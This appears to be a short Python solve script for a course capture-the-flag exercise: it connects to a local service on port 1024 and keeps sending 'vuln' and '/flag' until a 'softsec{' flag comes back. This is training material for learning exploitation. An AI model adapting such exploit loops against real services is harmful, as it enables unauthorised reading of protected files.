#!/usr/bin/env python3

import socket

# docker compose -f debug.yml up
# python3 ./solve_exam_prep.py

with socket.create_connection(('127.0.0.1', 1024)) as so:
    while True:
        so.sendall(b'vuln\n')
        flag = so.recv(1024)
        if b'softsec{' in flag:
            print(flag)
            break
        so.sendall(b'/flag\n')